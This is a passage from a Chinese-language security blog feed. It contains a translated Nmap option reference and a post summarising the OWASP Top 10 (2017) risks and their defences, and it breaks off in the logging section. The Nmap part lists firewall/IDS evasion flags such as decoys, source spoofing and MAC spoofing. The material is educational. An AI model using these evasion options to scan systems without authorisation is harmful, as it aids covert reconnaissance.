跳过主机发现</p><p>  -PS / PA / PU / PY [端口列表]：TCP SYN / ACK，UDP或SCTP发现到给定端口</p><p>  -PE / PP / PM：ICMP回送，时间戳和网络掩码请求发现探测</p><p>  -PO [协议列表]：IP协议Ping</p><p>  -n / -R：从不进行DNS解析/始终解析[默认：有时]</p><p>  –dns-servers <serv1 [，serv2]，...="">：指定自定义DNS服务器</serv1></p><p>  –system-dns：使用OS的DNS解析器</p><p>  –traceroute：每个主机的跟踪跳转路径</p><h4 id="扫描技术："><a href="#扫描技术：" class="headerlink" title="扫描技术："></a>扫描技术：</h4><p>  -sS / sT / sA / sW / sM：TCP SYN / Connect（）/ ACK / Window / Maimon扫描</p><p>  -sU：UDP扫描</p><p>  -sN / sF / sX：TCP Null，FIN和Xmas扫描</p><p>  –scanflags <flags>：自定义TCP扫描标志</flags></p><p>  -sI <zombie host="" [：probeport]="">：空闲扫描</zombie></p><p>  -sY / sZ：SCTP INIT / COOKIE-ECHO扫描</p><p>  -sO：IP协议扫描</p><p>  -b &lt;FTP中继主机&gt;：FTP反弹扫描</p><h4 id="港口规格和扫描令："><a href="#港口规格和扫描令：" class="headerlink" title="港口规格和扫描令："></a>港口规格和扫描令：</h4><p>  -p &lt;端口范围&gt;：仅扫描指定的端口</p><p>​    例如：-p22; -p1-65535; -p U：53,111,137，T：21-25,80,139,8080，S：9</p><p>  –exclude-ports &lt;端口范围&gt;：从扫描中排除指定的端口</p><p>  -F：快速模式 - 扫描比默认扫描更少的端口</p><p>  -r：连续扫描端口 - 不要随机化</p><p>  –top-ports <number>：扫描<number>最常见的端口</number></number></p><p>  –port-ratio <ratio>：扫描端口比<ratio>更常见</ratio></ratio></p><h4 id="服务-版本检测："><a href="#服务-版本检测：" class="headerlink" title="服务/版本检测："></a>服务/版本检测：</h4><p>  -sV：探测开放端口以确定服务/版本信息</p><p>  –version-intensity <level>：从0（亮）到9（尝试所有探针）设置</level></p><p>  –version-light：限制最可能的探针（强度2）</p><p>  –version-all：尝试每一个探针（强度9）</p><p>  –version-trace：显示详细的版本扫描活动（用于调试）</p><h4 id="脚本扫描："><a href="#脚本扫描：" class="headerlink" title="脚本扫描："></a>脚本扫描：</h4><p>  -sC：相当于–script = default</p><p>  –script = <lua scripts="">：<lua scripts="">是逗号分隔的列表</lua></lua></p><p>​           目录，脚本文件或脚本类别</p><p>  –script-args = <n1 =="" v1，[n2="v2，...]">：为脚本提供参数</n1></p><p>  –script-args-file = filename：在文件中提供NSE脚本args</p><p>  –script-trace：显示发送和接收的所有数据</p><p>  –script-updatedb：更新脚本数据库。</p><p>  –script-help = <lua scripts="">：显示有关脚本的帮助。</lua></p><p>​           <lua scripts="">是以逗号分隔的脚本文件列表或</lua></p><p>​           脚本的类别。</p><h4 id="操作系统检测："><a href="#操作系统检测：" class="headerlink" title="操作系统检测："></a>操作系统检测：</h4><p>  -O：启用OS检测</p><p>  –osscan-limit：将OS检测限制为有希望的目标</p><p>  –osscan-guess：更积极地猜测操作系统</p><h4 id="时间和性能："><a href="#时间和性能：" class="headerlink" title="时间和性能："></a>时间和性能：</h4><p>  采用<time>的选项以秒为单位，或追加’ms’（毫秒），</time></p><p>  该值的’s’（秒），’m’（分钟）或’h’（小时）（例如30m）。</p><p>  -T <0-5>：设置时序模板（越高越快）</0-5></p><p>  –min-hostgroup / max-hostgroup <size>：并行主机扫描组大小</size></p><p>  –min-parallelism / max-parallelism <numprobes>：探测并行化</numprobes></p><p>  –min-rtt-timeout / max-rtt-timeout / initial-rtt-timeout <time>：指定</time></p><p>​      探测往返时间。</p><p>  –max-retries <tries>：端口扫描探测重新传输的上限数量。</tries></p><p>  –host-timeout <time>：在此之后放弃目标</time></p><p>  –scan-delay /  -  max-scan-delay <time>：调整探针之间的延迟</time></p><p>  –min-rate <number>：发送数据包的速度不低于每秒<number></number></number></p><p>  –max-rate <number>：发送数据包的速度不超过每秒<number></number></number></p><h4 id="防火墙-IDS逃脱和防御："><a href="#防火墙-IDS逃脱和防御：" class="headerlink" title="防火墙/ IDS逃脱和防御："></a>防火墙/ IDS逃脱和防御：</h4><p>  -F; –mtu <val>：分段数据包（可选地，具有给定的MTU）</val></p><p>  -D &lt;decoy1，decoy2 [，ME]，…&gt;：用诱饵披露扫描</p><p>  -S &lt;IP_Address&gt;：欺骗源地址</p><p>  -e <iface>：使用指定的接口</iface></p><p>  -g /  -  source-port <portnum>：使用给定的端口号</portnum></p><p>  –proxies &lt;url1，[url2]，…&gt;：通过HTTP / SOCKS4代理中继连接</p><p>  –data <hex string="">：为发送的数据包附加自定义有效负载</hex></p><p>  –data-string <string>：为发送的数据包附加自定义ASCII字符串</string></p><p>  –data-length <num>：将随机数据附加到已发送的数据包</num></p><p>  –ip-options <options>：发送带有指定ip选项的数据包</options></p><p>  –ttl <val>：设置IP生存时间字段</val></p><p>  –spoof-mac &lt;mac地址/前缀/供应商名称&gt;：欺骗你的MAC地址</p><p>  –badsum：使用伪TCP / UDP / SCTP校验和发送数据包</p><p>OUTPUT：</p><p>  -oN / -oX / -oS / -oG <file>：正常输出扫描，XML，s | &lt;rIpt kIddi3，</file></p><p>​     和Grepable格式，分别为给定的文件名。</p><p>  -oA <basename>：一次输出三种主要格式</basename></p><p>  -v：增加详细级别（使用-vv或更高级别以获得更好的效果）</p><p>  -d：提高调试级别（使用-dd或更多以获得更好的效果）</p><p>  –reason：显示端口处于特定状态的原因</p><p>  –open：仅显示打开（或可能打开）的端口</p><p>  –packet-trace：显示发送和接收的所有数据包</p><p>  –iflist：打印主机接口和路由（用于调试）</p><p>  –append-output：追加而不是clobber指定的输出文件</p><p>  –resume <filename>：恢复中止扫描</filename></p><p>  –stylesheet &lt;path / URL&gt;：用于将XML输出转换为HTML的XSL样式表</p><p>  –webxml：来自Nmap.Org的参考样式表，用于更多可移植的XML</p><p>  –no-stylesheet：防止与XML输出相关联的XSL样式表</p><p>MISC：</p><p>  -6：启用IPv6扫描</p><p>  -A：启用操作系统检测，版本检测，脚本扫描和跟踪路由</p><p>  –datadir <dirname>：指定自定义Nmap数据文件位置</dirname></p><p>  –send-eth /  -  send-ip：使用原始以太网帧或IP数据包发送</p><p>  –privileged：假设用户具有完全特权</p><p>  –unprivileged：假设用户缺少原始套接字权限</p><p>  -V：打印版本号</p><p>  -h：打印此帮助摘要页面。</p><p>例子：</p><p>  nmap -v -A scanme.nmap.org</p><p>  nmap -v -sn 192.168.0.0/16 10.0.0.0/8</p><p>  nmap -v -iR 10000 -Pn -p 80</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="安全工具" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="安全工具" scheme="http://yoursite.com/tags/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>OWASP TOP 10</title>
    <link href="http://yoursite.com/2018/08/13/OWASP10/"/>
    <id>http://yoursite.com/2018/08/13/OWASP10/</id>
    <published>2018-08-13T12:24:05.000Z</published>
    <updated>2018-08-14T01:14:25.851Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦<br><img src="\images\pasted-56.png" alt="upload successful"></p><h1 id="什么是应用程序安全风险？"><a href="#什么是应用程序安全风险？" class="headerlink" title="什么是应用程序安全风险？"></a>什么是应用程序安全风险？</h1><p>攻击者可以通过应用程序中许多不同的路径方法去危害您的业务或者企业组织</p><p><img src="\images\pasted-55.png" alt="upload successful"></p><h1 id="A1注入"><a href="#A1注入" class="headerlink" title="A1注入"></a>A1注入</h1><h4 id="威胁来源"><a href="#威胁来源" class="headerlink" title="威胁来源"></a>威胁来源</h4><p>几乎任何数据源都能成为注入载体，包括环境变量、所有类型的用户、参数、外部和内部Web服务。当攻击者可以向解释器发送恶意数据时，注入漏洞产生</p><h4 id="安全弱点"><a href="#安全弱点" class="headerlink" title="安全弱点"></a>安全弱点</h4><p>注入漏洞十分普遍，尤其是在遗留代码中。注入漏洞通常能在SQL、 LDAP、 XPath或是NoSQL查询语句、 OS命令、 XML解析器、 SMTP包头、表达式语句及ORM查询语句中找到。</p><h4 id="影响"><a href="#影响" class="headerlink" title="影响"></a>影响</h4><p>注入能导致数据丢失、破坏或泄露给无授权方，缺乏可审计性或是拒绝服务。注入有时甚至能导致主机被完全接管</p><h4 id="应用程序的脆弱性"><a href="#应用程序的脆弱性" class="headerlink" title="应用程序的脆弱性"></a>应用程序的脆弱性</h4><p>当您的应用在如下时点时，是脆弱的并易受到攻击：</p><p>• 用户提供的数据没有经过应用程序的验证、过滤或净化。</p><p>• 动态查询语句或非参数化的调用，在没有上下文感知转义的情况下，被用于解释器。</p><p>• 在ORM搜索参数中使用了恶意数据，这样搜索就获得包含敏感或未授权的数据。</p><p>• 恶意数据直接被使用或连接，诸如SQL语句或命令在动态查询语<br>句、命令或存储过程中包含结构和恶意数据。</p><h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><p>防止注入漏洞需要将数据与命令语句、查询语句分隔开来。<br>• 最佳选择是使用安全的API，完全避免使用解释器，或提供参数化界面的接口，或迁移到ORM或实体框架。</p><p>• 注意： 当参数化时，存储过程仍然可以引入SQL注入，如果PL/SQL或T-SQL将查询和数据连接在一起，或者执行带有立即执行或exec()的恶意数据。</p><p>• 使用正确的或“白名单”的具有恰当规范化的输入验证方法同样会有助于防止注入攻击，但这不是一个完整的防御，因为许多应用程序在输入中需要特殊字符，例如文本区域或移动应用程序的API。</p><p>• 对于任何剩余的动态查询，可以使用该解释器的特定转义语法转义特殊字符。 OWASP的Java Encoder和类似的库提供了这样的转义例程</p><h1 id="A2失效的身份认证"><a href="#A2失效的身份认证" class="headerlink" title="A2失效的身份认证"></a>A2失效的身份认证</h1><h4 id="威胁来源-1"><a href="#威胁来源-1" class="headerlink" title="威胁来源"></a>威胁来源</h4><p>攻击者可以获得数百万的有效用户名和密码组合，包括证书填充、默认的管理帐户列表、自动的暴力破解和字典攻击工具，以及高级的GPU破解工具</p><h4 id="安全弱点-1"><a href="#安全弱点-1" class="headerlink" title="安全弱点"></a>安全弱点</h4><p>大多数身份和访问管理系统的设计和实现，普遍存在身份认证失效问题。会话管理是身份验证和访问控制的基础，并且存在于所有有状态应用程序中。攻击者可以使用指南手册来检测失效的身份验证，但通常会关注密码转储、字典攻击，或者在类似于钓鱼或社会工程攻击之后，发现失效的身份认证。</p><h4 id="影响-1"><a href="#影响-1" class="headerlink" title="影响"></a>影响</h4><p>攻击者只需要访问几个帐户，或者只需要一个管理员帐户就可以破坏我们的系统。根据应用程序领域的不同，可能会导致放任洗钱、社会安全欺诈以及用户身份盗窃、泄露法律高度保护的敏感信息。</p><h4 id="应用程序脆弱性"><a href="#应用程序脆弱性" class="headerlink" title="应用程序脆弱性"></a>应用程序脆弱性</h4><p>如果您的应用程序存在如下问题，那么可能存在身份验证的脆弱性：<br>• 允许凭证填充，这使得攻击者获得有效用户名和密码的列表。</p><p>• 允许暴力破解或其他自动攻击。</p><p>• 允许默认的、弱的或众所周知的密码，例如“Password1”或“admin/admin” 。</p><p>• 使用弱的或失效的验证凭证，忘记密码程序，例如“基于知识的答案”，这是不安全的。</p><p>• 使用明文、加密或弱散列密码（参见： A3:2017-敏感数据泄露）。</p><p>• 缺少或失效的多因素身份验证。</p><p>• 暴露URL中的会话ID（例如URL重写）。</p><p>• 在成功登录后不会更新会话ID。</p><p>• 不正确地使会话ID失效。当用户不活跃的时候，用户会话或认证令牌（特别是单点登录（SSO）令牌）没有正确注销或失效</p><h4 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h4><p>• 在可能的情况下，实现多因素身份验证，以防止自动、凭证填充、暴力破解和被盗凭据再利用攻击。</p><p>• 不要使用发送或部署默认的凭证，特别是管理员用户。</p><p>• 执行弱密码检查，例如测试新或变更的密码，以纠正“排名前10000个弱密码” 列表。</p><p>• 将密码长度、复杂性和循环策略与NIST-800-63 B的指导方针的5.1.1章节-记住秘密，或其他现代的基于证据的密码策略相一致。</p><p>• 确认注册、凭据恢复和API路径，通过对所有输出结果使用相同的消息，用以抵御账户枚举攻击。</p><p>• 限制或逐渐延迟失败的登录尝试。记录所有失败信息并在凭据填充、暴力破解或其他攻击被检测时提醒管理员。</p><p>• 使用服务器端安全的内置会话管理器，在登录后生成高度复杂的新随机会话ID。会话ID不能在URL中，可以安全地存储和当登出、闲置、绝对超时后使其失效。</p><h1 id="A3敏感信息泄露"><a href="#A3敏感信息泄露" class="headerlink" title="A3敏感信息泄露"></a>A3敏感信息泄露</h1><h4 id="威胁来源-2"><a href="#威胁来源-2" class="headerlink" title="威胁来源"></a>威胁来源</h4><p>攻击者不是直接攻击密码，而是在传输过程中或从客户端（例如：浏览器）窃取密钥、发起中间人攻击，或从服<br>务器端窃取明文数据。这通常需要手动攻击。通过使用图形处理单元（GPU），早前检索的密码数据库可能被暴力破解。</p><h4 id="安全弱点-2"><a href="#安全弱点-2" class="headerlink" title="安全弱点"></a>安全弱点</h4><p>这是最常见的、最具影响力的攻击。 这个领域最常见的漏洞是不对敏感信息进行加密。在数据加密过程中，常见的问题是不安全的密钥生成和管理以及使用弱加密算法、弱协议和弱密码。特别是使用弱的哈希算法来保护密码。在服务器端，检测传输过程中的数据弱点很容易， 但检测存储数据的弱点却非常困难。</p><h4 id="应用程序的脆弱性-1"><a href="#应用程序的脆弱性-1" class="headerlink" title="应用程序的脆弱性"></a>应用程序的脆弱性</h4><p>首先你需要确认的是哪些数据是敏感数据（包含：传输过程中的数据、存储数据）而需要被加密。例如：密码、信用卡卡号、医疗记录、个人信息应该被加密，特别是隐私法律或条例中规定需要加密的数据</p><p>对于这些数据，要确定：<br>• 在数据传输过程中是否使用明文传输？外部网络流量非常危险。验证所有的内部通信，如：负载平衡器、 Web服务器或后端系统之间的通信。</p><p>• 当数据被长期存储时，无论存储在哪里，它们是否都被加密，包含备份数据？</p><p>• 无论默认条件还是源代码中，是否还在使用任何旧的或脆弱的加密算法？</p><p>• 是否使用默认加密密钥，生成或重复使用脆弱的加密密钥，或者缺少恰当的密钥管理或密钥回转？</p><p>• 是否强制加密敏感数据，例如：用户代理（如：浏览器）指令和传输协议是否被加密？</p><h4 id="防御-2"><a href="#防御-2" class="headerlink" title="防御"></a>防御</h4><p>•对系统处理、存储或传输的数据分类，并根据分类进行访问控制。</p><p> • 熟悉与敏感数据保护相关的法律和条例，并根据每项法规要求保 护敏感数据。 </p><p>• 对于没必要存放的、重要的敏感数据，应当尽快清除。未存储的数据不能被窃取。 </p><p>• 确保存储的所有敏感数据被加密。</p><p> • 确保使用了最新的、强大的标准算法或密码、参数、协议和密匙， 并且密钥管理到位。 </p><p>• 确保传输过程中的数据被加密，如：使用TLS。 确保数据加密被 强制执行，如：使用HTTP严格安全传输（HSTS ）。</p><p> • 禁止缓存对包含敏感数据的响应。 </p><p>• 确保使用密码专用算法存储密码    </p><h1 id="A4XML外部实体"><a href="#A4XML外部实体" class="headerlink" title="A4XML外部实体"></a>A4XML外部实体</h1><h4 id="威胁来源-3"><a href="#威胁来源-3" class="headerlink" title="威胁来源"></a>威胁来源</h4><p>攻击者可以上传XML文档或者在XML文档中添加恶意内容，通过易受攻击的代码、依赖项或集成，他们就能够攻击含有缺陷的XML处理器。</p><h4 id="安全弱点-3"><a href="#安全弱点-3" class="headerlink" title="安全弱点"></a>安全弱点</h4><p>默认情况下，许多旧的XML处理器能够对外部实体、XML进程中被引用和评估的URI进行规范。XXE漏洞测试在2017年并不常见，因此手动测试人员需要通过接受培训来了解如何进行XXE漏洞测试。</p><h4 id="影响-2"><a href="#影响-2" class="headerlink" title="影响"></a>影响</h4><p>XXE缺陷可用于提取数据、执行远程服务器请求、扫描内部系统、执行拒绝服务攻击和其他攻击。</p><h4 id="应用程序的脆弱性-2"><a href="#应用程序的脆弱性-2" class="headerlink" title="应用程序的脆弱性"></a>应用程序的脆弱性</h4><p>应用程序和特别是基于XML的Web服务或向下集成，可能在以下方面容易受到攻击：<br>• 您的应用程序直接接受XML文件或者接受XML文件上传，特别是来自不受信任源的文件，或者将不受信任的数据插入XML文件，并提交给XML处理器解析。<br>• 在应用程序或基于Web服务的SOAP中，所有XML处理器都启用了文档类型定义（DTDs） </p><p>• 如果为了实现安全性或单点登录（SSO），您的应用程序使用SAML进行身份认证。而SAML使用XML进行身份确认，那么您的应用程序就容易受到XXE攻击</p><p>• 如果您的应用程序使用第1.2版之前的SOAP，并将XML实体传递到SOAP框架，那么它可能受到XXE攻击。</p><p>• 存在XXE缺陷的应用程序更容易受到拒绝服务攻击</p><h4 id="防御-3"><a href="#防御-3" class="headerlink" title="防御"></a>防御</h4><p>•尽可能使用简单的数据格式（如： JSON），避免对敏感数据进行序列化。</p><p>• 及时修复或更新应用程序或底层操作系统使用的所有XML处理器和库。将SOAP更新到1.2版本或更高版本</p><p>• 在应用程序的所有XML解析器中禁用XML外部实体和DTD进程。</p><p>• 在服务器端实施积极的（“白名单”）输入验证、过滤和清理</p><p>• 验证XML或XSL文件上传功能是否使用XSD验证或其他类似验证方法来验证上传的XML文件。</p><p>• SAST 工具可以检测源代码中的XXE漏洞</p><h1 id="A5失效的访问控制"><a href="#A5失效的访问控制" class="headerlink" title="A5失效的访问控制"></a>A5失效的访问控制</h1><h4 id="威胁来源-4"><a href="#威胁来源-4" class="headerlink" title="威胁来源"></a>威胁来源</h4><p>对访问控制的利用是渗透测试人员的一项核心技能。 SAST 工具和 DAST工具可以检测到访问控制的缺失，但不能验证其功能是否正常。访问控制可通过手动方式检测，或在某些特定框架下通过自动化检测访问控制缺失</p><h4 id="安全弱点-4"><a href="#安全弱点-4" class="headerlink" title="安全弱点"></a>安全弱点</h4><p>由于缺乏自动化的检测和应用程序开发人员缺乏有效的功能测试，因而访问控制缺陷很常见。</p><h4 id="影响-3"><a href="#影响-3" class="headerlink" title="影响"></a>影响</h4><p>技术影响是攻击者可以冒充用户、管理员或拥有特权的用户，或者创建、访问、更新或删除任何记录。业务影响取决于应用程序和数据的保护需求。</p><h4 id="应用程序的脆弱性-3"><a href="#应用程序的脆弱性-3" class="headerlink" title="应用程序的脆弱性"></a>应用程序的脆弱性</h4><p>常见的访问控制脆弱点包括：<br>• 通过修改 URL、内部应用程序状态或 HTML 页面绕过访问控制检查，或简单地使用自定义的 API 攻击工具</p><p>• 允许将主键更改为其他用户的记录，例如查看或编辑他人的帐户。</p><p>• 特权提升。在不登录的情况下假扮用户，或以用户身份登录时充当管理员。</p><p>• 元数据操作，如重放或篡改 JWT 访问控制令牌，或作以提升权限的cookie 或隐藏字段。</p><p>• CORS配置错误允许未授权的API访问。</p><p>• 以未通过身份验证的用户身份强制浏览的通过身份验证时才能看到的页面</p><h4 id="防御-4"><a href="#防御-4" class="headerlink" title="防御"></a>防御</h4><p>访问控制只有在受信服务器端代码或没有服务器的 API 中有效，这样这样攻击者才无法修改访问控制检查或元数据。<br>• 除公有资源外，默认情况下拒绝访问。</p><p>• 使用一次性的访问控制机制</p><p>• 建立访问控制模型以强制执行所有权记录，而不是接受用户创建、读取、更新或删除的任何记录。</p><p>• 域访问控制对每个应用程序都是唯一的，但业务限制要求应由域模型强制执行。</p><p>• 禁用 Web服务器目录列表，并确保文件元数据（如： git）不存在于 Web的根目录中。</p><p>• 记录失败的访问控制，并在适当时向管理员告警（如：重复故障）。</p><p>• 对API和控制器的访问进行速率限制，以最大限度地降低自动化攻击工具的危害。</p><p>• 当用户注销后，服务器上的JWT令牌应失效。</p><h1 id="A6安全配置错误"><a href="#A6安全配置错误" class="headerlink" title="A6安全配置错误"></a>A6安全配置错误</h1><h4 id="威胁来源-5"><a href="#威胁来源-5" class="headerlink" title="威胁来源"></a>威胁来源</h4><p>攻击者能够通过未修复的漏洞、访问默认账户、不再使用的页面、未受保护的文件和目录等来取得对系统的未授权的访问或了解。</p><h4 id="安全弱点-5"><a href="#安全弱点-5" class="headerlink" title="安全弱点"></a>安全弱点</h4><p>安全配置错误可以发生在一个应用程序堆栈的任何层面</p><h4 id="影响-4"><a href="#影响-4" class="headerlink" title="影响"></a>影响</h4><p>这些漏洞使攻击者能经常访问一些未授权的系统数据或功能。有时，这些漏洞导致系统的完全攻破。业务影响取决于您的应用程序和数据的保护需求。</p><h4 id="应用程序的脆弱性-4"><a href="#应用程序的脆弱性-4" class="headerlink" title="应用程序的脆弱性"></a>应用程序的脆弱性</h4><p>您的应用程序可能受到攻击，如果应用程序是：<br>• 应用程序栈堆的任何部分都缺少适当的安全加固，或者云服务的权限配置错误。</p><p>• 应用程序启用或安装了不必要的功能（例如：不必要的端口、服务、网页、帐户或权限）。</p><p>• 默认帐户的密码仍然可用且没有更改。</p><p>• 错误处理机制向用户披露堆栈跟踪或其他大量错误信息。</p><p>• 对于更新的系统，禁用或不安全地配置最新的安全功能。</p><p>• 应用程序服务器、应用程序框架（如： Struts、 Spring、ASP.NET）、库文件、数据库等没有进行安全配置。</p><p>• 服务器不发送安全标头或指令，或者未对服务器进行安全配置。</p><p>• 您的应用软件已过期或易受攻击（参见A9： 2017-使用含有已知漏洞的组件）。</p><h4 id="防御-5"><a href="#防御-5" class="headerlink" title="防御"></a>防御</h4><p>应实施安全的安装过程，包括：<br>• 一个可以快速且易于部署在另一个锁定环境的可重复的加固过程。开发、质量保证和生产环境都应该进行相同配置，并且，在每个环境中使用不同的密码。</p><p>• 搭建最小化平台，移除或不安装不适用的功能和框架。</p><p>• 检查和修复安全配置项来适应最新的安全说明、更新和补丁，并将其作为更新管理过程的一部分</p><p>• 一个能在组件和用户间提供有效的分离和安全性的分段应用程序架构，包括：分段、容器化和云安全组。</p><p>• 向客户端发送安全指令，如： 安全标头。</p><p>• 在所有环境中能够进行正确安全配置和设置的自动化过程。</p><h1 id="A7跨站脚本XSS"><a href="#A7跨站脚本XSS" class="headerlink" title="A7跨站脚本XSS"></a>A7跨站脚本XSS</h1><h4 id="威胁来源-6"><a href="#威胁来源-6" class="headerlink" title="威胁来源"></a>威胁来源</h4><p>自动化工具能够检测并利用所有的三种XSS形式，并且存在方便攻击者利用漏洞的框架。</p><h4 id="安全弱点-6"><a href="#安全弱点-6" class="headerlink" title="安全弱点"></a>安全弱点</h4><p>XSS是OWASP Top10中第二普遍的安全问题，存在于近三分之二的应用中。自动化工具能自动发现一些XSS问题，特别是在一些成熟的技术中，如： PHP、 J2EE或JSP、 ASP.NET。</p><h4 id="影响-5"><a href="#影响-5" class="headerlink" title="影响"></a>影响</h4><p>XSS对于反射和DOM的影响是中等的，而对于存储的XSS， XSS的影响更为严重，譬如在受攻击者的<br>浏览器上执行远程代码，例如：窃取凭证和会话或传递恶意软件等。</p><h4 id="应用程序的脆弱性-5"><a href="#应用程序的脆弱性-5" class="headerlink" title="应用程序的脆弱性"></a>应用程序的脆弱性</h4><p>存在三种XSS类型，通常针对用户的浏览器：<br>反射式XSS： 应用程序或API包括未经验证和未经转义的用户输入，作为HTML输出的一部分。</p><p>存储式XSS： 你的应用或者API将未净化的用户输入存储下来了，并在后期在其他用户或者管理员的页面展示出来。 存储型XSS一般被认为是高危或严重的风险。</p><p>基于DOM的XSS： 会动态的将攻击者可控的内容加入页面的JavaScript框架、单页面程序或API存在这种类型的漏洞</p><p>典型的XSS攻击可导致盗取session、账户、绕过MFA、 DIV替换、对用户浏览器的攻击（例如：恶意软件下载、键盘记录）以及其他用户的攻击。</p><h4 id="防御-6"><a href="#防御-6" class="headerlink" title="防御"></a>防御</h4><p>防止XSS需要将不可信数据与动态的浏览器内容区分开。 这可以通过如下步骤实现：</p><p>• 使用设计上就会自动编码来解决XSS问题的框架，如： Ruby 3.0</p><p>• 为了避免反射式或存储式的XSS漏洞，最好的办法是根据HTML输出的上下文（包括：主体、属性、 JavaScript、 CSS或URL）对所有不可信的HTTP请求数据进行恰当的转义 。 </p><p>• 在客户端修改浏览器文档时，为了避免DOM XSS攻击，最好的选择是实施上下文敏感数据编码。 </p><p>• 使用内容安全策略（CSP） 是对抗XSS的深度防御策略。</p><h1 id="A8不安全的反序列化"><a href="#A8不安全的反序列化" class="headerlink" title="A8不安全的反序列化"></a>A8不安全的反序列化</h1><h4 id="威胁来源-7"><a href="#威胁来源-7" class="headerlink" title="威胁来源"></a>威胁来源</h4><p>对反序列化的利用是有点困难的。因为在不更改或调整底层可被利用代码的情况下，现成的反序列化漏洞很难<br>被使用。</p><h4 id="安全弱点-7"><a href="#安全弱点-7" class="headerlink" title="安全弱点"></a>安全弱点</h4><p>有些工具可以被用于发现反序列化缺陷，但经常需要人工帮助来验证发现的问题。</p><h4 id="影响-6"><a href="#影响-6" class="headerlink" title="影响"></a>影响</h4><p>反序列化缺陷的影响不能被低估。它们可能导致远程代码执行攻击，这是可能发生的最严重的攻击之一。</p><h4 id="应用程序的脆弱性-6"><a href="#应用程序的脆弱性-6" class="headerlink" title="应用程序的脆弱性"></a>应用程序的脆弱性</h4><p>如果反序列化进攻者提供的敌意或者篡改过的对象将会使将应用程序和API变的脆弱。<br>这可能导致两种主要类型的攻击：<br>• 如果应用中存在可以在反序列化过程中或者之后被改变行为的类，则攻击者可以通过改变应用逻辑或者实现远程代码执行攻击。</p><p>• 典型的数据篡改攻击，如访问控制相关的攻击，其中使用了现有的数据结构，但内容发生了变化。</p><h4 id="防御-7"><a href="#防御-7" class="headerlink" title="防御"></a>防御</h4><p>唯一安全的架构模式是不接受来自不受信源的序列化对象，或使用只允许原始数据类型的序列化媒体。<br>如果上述不可能的话，考虑使用下述方法：</p><p>• 执行完整性检查，如：任何序列化对象的数字签名，以防止恶意对象创建或数据篡改。</p><p>• 在创建对象之前强制执行严格的类型约束，因为代码通常被期望成一组可定义的类。绕过这种技术的方法已经被证明，所以完全依赖于它是不可取的。</p><p>• 如果可能，隔离运行那些在低特权环境中反序列化的代码。</p><p>• 记录反序列化的例外情况和失败信息</p><p>• 限制或监视来自于容器或服务器传入和传出的反序列化网络连接。</p><h1 id="A9使用含有已知漏洞的组件"><a href="#A9使用含有已知漏洞的组件" class="headerlink" title="A9使用含有已知漏洞的组件"></a>A9使用含有已知漏洞的组件</h1><h4 id="威胁来源-8"><a href="#威胁来源-8" class="headerlink" title="威胁来源"></a>威胁来源</h4><p>对一些漏洞很容易找到其利用程序</p><h4 id="安全弱点-8"><a href="#安全弱点-8" class="headerlink" title="安全弱点"></a>安全弱点</h4><p>这种安全漏洞普遍存在。基于组件开发的模式使得多数开发团队根本不了解其应用或API中使用的组件，更谈不上及时更新这些组件了。</p><h4 id="影响-7"><a href="#影响-7" class="headerlink" title="影响"></a>影响</h4><p>虽然对于一些已知的漏洞其影响很小，但目前很多严重的安全事件都是利用组件中的已知漏洞。根据你所要保护的资产，此类风险等级可能会很高。</p><h4 id="应用程序的脆弱性-7"><a href="#应用程序的脆弱性-7" class="headerlink" title="应用程序的脆弱性"></a>应用程序的脆弱性</h4><p>如果满足下面的某个条件，那么你的应用就易受此类攻击：<br>• 如果你不知道所有使用的组件版本信息</p><p>• 如果软件易受攻击，不再支持或者过时。这包括： OS、 Web服务器、应用程序服务器、数据库管理系统（DBMS）、应用程序、API和所有的组件、运行环境和库。</p><p>• 如果你不会定期做漏洞扫描和订阅你使用组件的安全公告。</p><p>• 如果你不基于风险并及时修复或升级底层平台、框架和依赖库。</p><p>• 如果软件工程师没有对更新的、升级的或打过补丁的组件进行兼容性测试。</p><p>• 如果你没有对组件进行安全配置</p><h4 id="防御-8"><a href="#防御-8" class="headerlink" title="防御"></a>防御</h4><p>应该制定一个补丁管理流程：<br>• 移除不使用的依赖、不需要的功能、组件、文件和文档。</p><p>• 利用如 versions、 DependencyCheck 、 retire.js等工具来持续的记录客户端和服务器端以及它们的依赖库的版本信息，订阅关于使用组件安全漏洞的警告邮件。</p><p>• 仅从官方渠道安全的获取组件，并使用签名机制来降低组件被篡改或加入恶意漏洞的风险</p><p>• 监控那些不再维护或者不发布安全补丁的库和组件。</p><h1 id="A10不足的日志记录和监控"><a href="#A10不足的日志记录和监控" class="headerlink" title="A10不足的日志记录和监控"></a>A10不足的日志记录和监控</h1><h4 id="威胁来源-9"><a href="#威胁来源-9" class="headerlink" title="威胁来源"></a>威胁来源</h4><p>攻击者依靠监控的不足和响应的不及时来达成他们的目标而不被知晓。</p><h4 id="安全弱点-9"><a href="#安全弱点-9" class="headerlink" title="安全弱点"></a>安全弱点</h4><p>判断你是否有足够监控的一个策略是在渗透测试后检查日志。 测试者的活动应被充分的记录下来，能够反映出他们造成了什么样的影响。</p><h4 id="影响-8"><a href="#影响-8" class="headerlink" title="影响"></a>影响</h4><p>多数成功的攻击往往从漏洞探测开始。允许这种探测会将攻击成功的可能性提高到近100%</p><h4 id="应用程序的脆弱性-8"><a href="#应用程序的脆弱性-8" class="headerlink" title="应用程序的脆弱性"></a>应用程序的脆弱性</h4><p> 下列情况会导致不足的日志记录、检测、监控和响应：<br>• 未记录可审计性事件，如：登录、登录失败和高额交易。</p><p>• 告警和错误事件未能产生或产生不足的和不清晰的日志信息。</p><p>• 没有利用应用系统和API的日志信息来监控可疑活动。</p><p>• 日志信息仅在本地存储。</p><p>• 没有定义合理的告警阈值和制定响应处理流程。</p><p>• 渗透测试和使用DAST工具（如： OWASP ZAP）扫描没有触发告警</p><p>• 对于实时或准实时的攻击，应用程序无法检测、处理和告警</p><h4 id="防御-9"><a href="#防御-9" class="headerlink" title="防御"></a>防御</h4><p>根据应用程序存储或处理的数据的风险：<br>• 确保所有登录、访问控制失败、输入验证失败能够被记录到日志中去，并保留足够的用户上下文信息，以识别可疑或恶意帐户，并为后期取证预留足够时间。</p><p>• 确保日志以一种能被集中日志管理解决方案使用的形式生成</p><p>• 